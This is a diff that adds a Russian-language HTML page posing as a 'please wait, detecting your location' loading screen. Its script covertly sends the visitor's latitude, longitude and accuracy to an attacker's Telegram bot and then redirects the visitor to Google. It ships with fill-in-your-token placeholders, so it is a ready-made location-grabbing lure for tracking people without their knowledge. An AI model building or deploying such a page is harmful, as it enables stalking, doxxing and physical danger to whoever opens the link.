@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Подождите...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    h2 {
+      font-size: 1.4em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1em;
+      max-width: 90%;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h2>Определяем ваше местоположение...</h2>
+  <p>Пожалуйста, разрешите доступ к геолокации в появившемся окне</p>
+
+  <script>
+    const token = "ТВОЙ_ТОКЕН_БОТА";              // <-- Вставь сюда токен бота
+    const chat_id = "ТВОЙ_CHAT_ID";               // <-- Вставь сюда chat ID
+    const redirectUrl = "https://www.google.com"; // <-- Куда перенаправить пользователя
+
+    function sendToTelegram(lat, lon, acc) {
+      const text = `📍 Геолокация:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${acc} м`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chat_id, text: text })
+      }).then(() => {
+        window.location.href = redirectUrl;
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          sendToTelegram(lat, lon, acc);
+        },
+        (error) => {
+          document.body.innerHTML = `<h2>Ошибка:</h2><p>${error.message}</p>`;
+        }
+      );
+    } else {
+      document.body.innerHTML = "<h2>Геолокация не поддерживается</h2>";
+    }
+  </script>
+</body>
+</html>
